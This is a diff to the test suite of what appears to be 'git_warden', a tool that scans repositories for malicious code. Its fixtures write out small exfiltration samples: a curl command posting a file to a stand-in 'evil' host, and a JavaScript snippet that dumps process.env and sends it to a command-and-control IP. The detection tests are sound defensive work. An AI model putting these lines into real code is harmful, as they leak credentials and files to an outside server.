@@ -56,6 +56,32 @@ def test_scan_candidate_returns_none_on_clone_failure(tmp_path):
     assert result is None
 
 
+def test_scan_candidate_captures_commit_sha_for_permanent_evidence(tmp_path):
+    """The scanned commit SHA is recorded so evidence can pin to /blob/<sha>/."""
+    from git_warden.scanning.tier2 import _read_head_sha
+    sha = "b" * 40
+
+    def fake_clone(full_name, dest, *, runner=None):
+        dest.mkdir(parents=True, exist_ok=True)
+        _make_malicious_repo(dest)
+        return dest
+
+    class R:
+        returncode = 0
+        stdout = sha + "\n"
+        stderr = ""
+
+    result = scan_candidate("evil/repo", tmp_path, clone=fake_clone,
+                            runner=lambda *a, **k: R())
+    assert result is not None and result.commit_sha == sha
+    # _read_head_sha rejects a non-40-char / failed rev-parse (fails safe to '')
+    class Bad:
+        returncode = 1
+        stdout = "nope"
+        stderr = ""
+    assert _read_head_sha(tmp_path, runner=lambda *a, **k: Bad()) == ""
+
+
 def test_clone_rejects_invalid_full_name(tmp_path):
     from git_warden.scanning.tier2 import clone_repo
     # eval #16: traversal / non-allowlisted names rejected before any fs/clone op.
@@ -403,3 +429,18 @@ def test_restrict_paths_limits_findings(tmp_path):
     (tmp_path / "added.sh").write_text("curl -d @y http://evil\n", encoding="utf-8")
     res = analyze_repo(tmp_path, "o/r", restrict_paths={"added.sh"})
     assert {f.file for f in res.bash_findings} == {"added.sh"}
+
+
+def test_vscode_shellenv_env_read_does_not_confirm(tmp_path):
+    # 2026-07-07: VS Code + forks read the login shell env via
+    # `${execPath} -p JSON.stringify(process.env)` for terminal inheritance. That
+    # env-dump must NOT confirm; a real stealer's dump does not spawn the app.
+    (tmp_path / "shellEnv.ts").write_text(
+        "const command = `& '${process.execPath}' -p 'JSON.stringify(process.env)'`;\n",
+        encoding="utf-8")
+    assert not analyze_repo(tmp_path, "posit-dev/positron").confirmed
+    # a genuine whole-env dump still confirms (env-dump is confirm-alone)
+    (tmp_path / "steal.js").write_text(
+        "const x = JSON.stringify(process.env);\nfetch('http://185.5.5.5/c2',{body:x});\n",
+        encoding="utf-8")
+    assert analyze_repo(tmp_path, "evil/stealer").confirmed
